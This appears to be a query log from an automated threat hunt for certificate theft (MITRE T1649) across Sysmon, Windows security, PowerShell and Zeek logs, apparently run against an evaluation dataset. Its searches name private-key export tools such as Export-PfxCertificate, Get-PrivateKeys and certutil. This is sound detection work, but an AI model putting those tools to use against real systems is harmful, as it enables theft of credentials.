| q-54eefbbaa9 | triage T1649 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND file.path:*pfx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "file.path", "win.TargetFilename"], "size": 20, "so… | 1 |  |
| q-6aa0c1be52 | triage T1649 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None | F51 |
| q-d7715735aa | triage T1649 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Export-PfxCertificate* OR process.command_line:*Get-PrivateKeys* OR process.command_line:*certutil* OR process.command_line:*readme.ps1*)", "time_from": null, "time_to": null, "fie… | 0 |  |
| q-c34babe1db | triage T1649 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.pid:3876", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "process.parent.executable", "process.parent.comman… | 2 |  |
| q-34d4ff3f1d | triage T1649 step 3 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None | F52 |
| q-54ec843695 | triage T1649 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None | F51 |
| q-72e1c20800 | triage T1649 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*SystemCertificates*ROOT*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "registry.path", "registry.… | 0 |  |
| q-192342b1cf | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-80a6416a06 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-69f25d88f7 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-32460489e5 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-34a4d3852a | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-eb360352ea | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-fbcbc07883 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-ee4e9cb437 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-c2d51c0491 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-778ba890d3 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-0e1cc17a73 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-1b0d559c42 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-e75b7b1087 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-4f6c9331be | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-b89e52ce14 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-32f95ed6db | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-2f1f99b911 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-a90d07754e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-ad601475b0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-3ebeff4e9b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dd"} | None |  |
| q-3e5c5a883b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dg"} | None |  |
| q-1fdfef3bc7 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoYO"} | None |  |
| q-fbddbc8d98 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-8fe211ab4a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-0994e343c3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt4o2y"} | None |  |
| q-ccb415d4e2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-c83d5d3d57 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOuYQdN"} | None |  |
| q-4ef3203540 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9qRCx"} | None |  |
| q-a8138598d7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlQHBV"} | None |  |
| q-7630d8524b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-0f9a2ca2c3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1C1"} | None |  |
| q-fcd8ed207f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-be83336fde | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None |  |
| q-bd06142e5a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b45614b107 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-fb3890117f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-aa4746a5f9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-299571e3a7 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-6c92dbceda | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1Cy"} | None |  |
| q-4e36e032ad | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFD4"} | None |  |
| q-a116cfd490 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-3a1dc87582 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-1daee006b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-56a2cb5e1d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-58abe68502 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-bdc7807a9b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-570fe4dfbb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b9b6ab3b58 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVr3Lv_"} | None |  |
| q-24bbbaf4ea | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-298a540915 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-2879764781 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9J"} | None |  |
| q-d1b90b2c97 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-ef0d4b57d3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-a977185092 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-d64599d757 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO_tniJ"} | None |  |
| q-87aa9748ba | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-aeaec35e1d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-58261e6fb1 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-c6b5fcf16c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-45b92f3345 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-9e6f2e470f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-14f7d16243 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-fb57c64188 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmcl_4"} | None |  |
| q-d95b4c6a18 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-6740ab3669 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgH"} | None |  |
| q-630843b67b | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-ac312d3d1c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-5a4ef770f3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQt-"} | None |  |
| q-fd4c2c1911 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKDB"} | None |  |
| q-838df949cb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-306306b5b2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-d462f2af69 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOkOj38"} | None |  |
| q-720086003e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlP3A4"} | None |  |
| q-8194fd7927 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-226e76f603 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-9ecd273f20 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn01Pa"} | None |  |
| q-98414feecc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZJhF-L"} | None |  |
| q-ddd60cf0f3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-a1b9c6780c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-bd74973e1f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTWI7pZ"} | None |  |
| q-212f25e629 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-0988d486a6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-dafc1032da | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-f0338eda31 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-d424cd0e63 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-2cfd1baa53 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-d891df6dbc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-df13c87754 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-bb0544fb2a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-46a82d0f0d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-4e9991dfc8 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUm"} | None |  |
| q-3aa5827d65 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7E__C"} | None |  |
| q-8c2c92f2c6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-1UI"} | None |  |
| q-bacf7c271c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3W"} | None |  |
| q-6620afeced | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-d51c81a0bc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-b2aefe2370 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-b139d5162b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-7ec9d5ea3d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-c32aed4e4d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-4fd9878f85 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVq1T6-"} | None |  |
| q-b659f25f04 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-7504e4233d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-2d404dbdb4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-e88bb07cd1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-71b5deff45 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-e4979817df | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-45a5e52a52 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_JuD"} | None |  |
| q-7b8b32716c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-0b92815e05 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPEz_fX"} | None |  |
| q-c5a8346092 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO7oWgL"} | None |  |
| q-83baa92c5c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-72719af858 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt5I2Y"} | None |  |
| q-6e4d76a71b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-e65cdb1eb6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-f318f79d50 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-7ea2767c95 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-bd2c51ed24 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-6d88e3010a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-078921954d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-2993709295 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-fade42da0d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-d5fc641154 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-22d24b5c84 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-e4864b80c3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-c40d2955f4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-390c9a073b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqgghU"} | None |  |
| q-9046faccf1 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-ee785d3a47 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYj4"} | None |  |
| q-11eb87e8e8 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-68f5e44bd6 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog4"} | None |  |
| q-515b73c523 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQD9ggh"} | None |  |
| q-9eb5e05364 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-53b1ef6356 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-34410d8aa1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-7094531965 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-a7d8486703 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-5594e66110 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqNA3"} | None |  |
| q-eb91cf358c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-0125dfb938 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-cc010d00e3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-3b33a562d4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
| q-230369a68f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aUM"} | None |  |
| q-683c06c23b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-59b73066a2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FbW6"} | None |  |
| q-4ffb66e0e3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-41dca27ab0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aXJ"} | None |  |
| q-6f0c2bdad8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-21012255e0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-2e5a0f8550 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-9ec7d6e997 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-38238edd59 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-d8b65c8536 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-6b3902dcc1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-b91f0363da | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_Zth"} | None |  |
| q-d24fa8cff5 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-345af5758f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYi0"} | None |  |
| q-4d047d0d19 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjk"} | None |  |
| q-1716d87068 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rp"} | None |  |
| q-8676796c35 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-e2b75ebb70 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-d3a6db8690 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-0c29345caa | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-8c2ae50141 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUGBlWZ"} | None |  |
| q-49ad3aaed5 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-e9921f5c53 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-f4d0721492 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-c71df8cd5d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-cfa45774a1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-1b44d0e178 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-c17f0bd563 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-f8ae224060 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-059f4730aa | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-680ca76f3e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-50de65bd5d | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29.430000+00:00", "time_to": "2020-05-02T03:26:39+00:00", "size": 100, "sub_field": "process.parent.exec… | 61 |  |
| q-afc85a3ad2 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29.430000+00:00", "time_to": "2020-05-02T03:26:39+00:00", "size": 100, "sub_field": "process.executable"} | 248 |  |
